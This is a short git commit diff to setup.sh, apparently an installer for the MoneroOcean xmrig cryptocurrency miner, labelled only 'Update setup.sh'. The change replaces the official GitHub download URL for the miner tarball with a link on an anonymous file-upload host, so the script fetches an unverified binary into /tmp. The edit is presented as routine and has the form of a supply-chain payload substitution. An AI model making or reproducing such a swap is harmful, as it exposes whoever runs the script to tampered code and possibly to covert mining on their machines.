4b71cdc388d16aec63bf05e04ae62b587c7d9fa5
nguyentructructv0901 <nguyentructructv0901@gmail.com>
2025-09-21 12:40:53 +0700

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -155,8 +155,8 @@ echo "[*] Removing $HOME/moneroocean directory"
 rm -rf $HOME/moneroocean
 
 echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
-if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
-  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
+if ! curl -L --progress-bar "https://bashupload.com/AoklY/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
+  echo "ERROR: Can't download https://bashupload.com/AoklY/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
   exit 1
 fi
 
